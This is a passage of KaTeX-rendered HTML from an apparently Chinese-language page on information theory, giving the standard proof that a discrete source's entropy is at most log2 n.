class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>n</mi></mrow><annotation encoding="application/x-tex">H(X)=\log _2n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9386em;vertical-align:-0.2441em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></strong>，因为</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>∵</mo><mi>ln</mi><mo>⁡</mo><mi>x</mi><mo>≤</mo><mi>x</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mi>x</mi><mo>&gt;</mo><mn>0</mn><mtext> </mtext><mi>a</mi><mi>n</mi><mi>d</mi><mtext> </mtext><mtext> </mtext><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>x</mi><mo>=</mo><mfrac><mrow><mi>ln</mi><mo>⁡</mo><mi>x</mi></mrow><mrow><mi>ln</mi><mo>⁡</mo><mn>2</mn></mrow></mfrac></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi>H</mi><mrow><mo fence="true">(</mo><mi>X</mi><mo fence="true">)</mo></mrow><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mfrac><mi>n</mi><mrow><mi>n</mi><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow></mfrac><mo>=</mo></mrow><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>n</mi></mrow><mo>+</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mfrac><mn>1</mn><mrow><mi>n</mi><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow></mfrac></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>n</mi><mo>+</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mfrac><mn>1</mn><mrow><mi>n</mi><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow></mfrac><mo>=</mo></mrow><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>n</mi><mo>+</mo><mfrac><mn>1</mn><mrow><mi>ln</mi><mo>⁡</mo><mn>2</mn></mrow></mfrac><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mi>ln</mi><mo>⁡</mo><mfrac><mn>1</mn><mrow><mi>n</mi><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow></mfrac></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>≤</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>n</mi><mo>+</mo><mfrac><mn>1</mn><mrow><mi>ln</mi><mo>⁡</mo><mn>2</mn></mrow></mfrac><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mrow><mo fence="true">(</mo><mfrac><mn>1</mn><mrow><mi>n</mi><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow></mfrac><mo>−</mo><mn>1</mn><mo fence="true">)</mo></mrow></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>n</mi><mo>+</mo><mfrac><mn>1</mn><mrow><mi>ln</mi><mo>⁡</mo><mn>2</mn></mrow></mfrac><mrow><mo fence="true">(</mo><mn>1</mn><mo>−</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow><mo fence="true">)</mo></mrow><mo>=</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>n</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{align*}&amp;\because \ln x\le x-1, x&gt;0 \ and\,\,\log _2x=\frac{\ln x}{\ln 2}\\&amp;H\left( X \right) =\sum_{i=1}^n{p\left( a_i \right) \log _2\frac{n}{np\left( a_i \right)}=}\sum_{i=1}^n{p\left( a_i \right) \log _2n}+\sum_{i=1}^n{p\left( a_i \right) \log _2\frac{1}{np\left( a_i \right)}}\\&amp;=\log _2n+\sum_{i=1}^n{p\left( a_i \right) \log _2\frac{1}{np\left( a_i \right)}=}\log _2n+\frac{1}{\ln 2}\sum_{i=1}^n{p\left( a_i \right) \ln \frac{1}{np\left( a_i \right)}}\\&amp;\le \log _2n+\frac{1}{\ln 2}\sum_{i=1}^n{p\left( a_i \right) \left( \frac{1}{np\left( a_i \right)}-1 \right)}\\&amp;=\log _2n+\frac{1}{\ln 2}\left( 1-\sum_{i=1}^n{p\left( a_i \right)} \right) =\log _2n\end{align*}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:15.3723em;vertical-align:-7.4362em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:7.9362em;"><span style="top:-10.3147em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"></span></span><span style="top:-7.6773em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"></span></span><span style="top:-4.4483em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"></span></span><span style="top:-1.2192em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"></span></span><span style="top:2.1085em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:7.4362em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:7.9362em;"><span style="top:-10.3147em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">∵</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop">ln</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span><span class="mspace"> </span><span class="mord mathnormal">an</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop">ln</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop">ln</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-7.6773em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1076em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><span style="top:-4.4483em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop">ln</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">ln</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span 